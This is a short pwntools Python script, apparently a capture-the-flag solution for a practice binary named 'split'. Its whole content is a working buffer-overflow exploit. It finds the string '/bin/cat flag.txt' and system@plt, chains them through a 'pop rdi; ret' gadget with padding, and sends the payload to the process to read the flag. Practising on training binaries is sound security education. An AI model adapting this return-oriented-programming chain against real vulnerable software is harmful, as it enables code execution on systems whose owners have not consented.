from pwn import *



elf = ELF("./split")

cat_flag_adr = next(elf.search(b"/bin/cat flag.txt"))
system_plt_adr = elf.plt["system"]

# 0x00000000004007c3 : pop rdi ; ret
pop_first_arg_gadget = pack(0x00000000004007c3, 64)
log.info("string: " + hex(cat_flag_adr) + f" {cat_flag_adr}")


payload = b""
payload += b"A"*(54-8-2-4)
payload += pop_first_arg_gadget
payload += pack(cat_flag_adr, 64)
payload += pack(system_plt_adr, 64)
payload += b"B"*4   # ret

write("/tmp/docgil", payload)

p = process(["./split"])
r = p.recv()
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall()
log.info(f"flag: {flag}")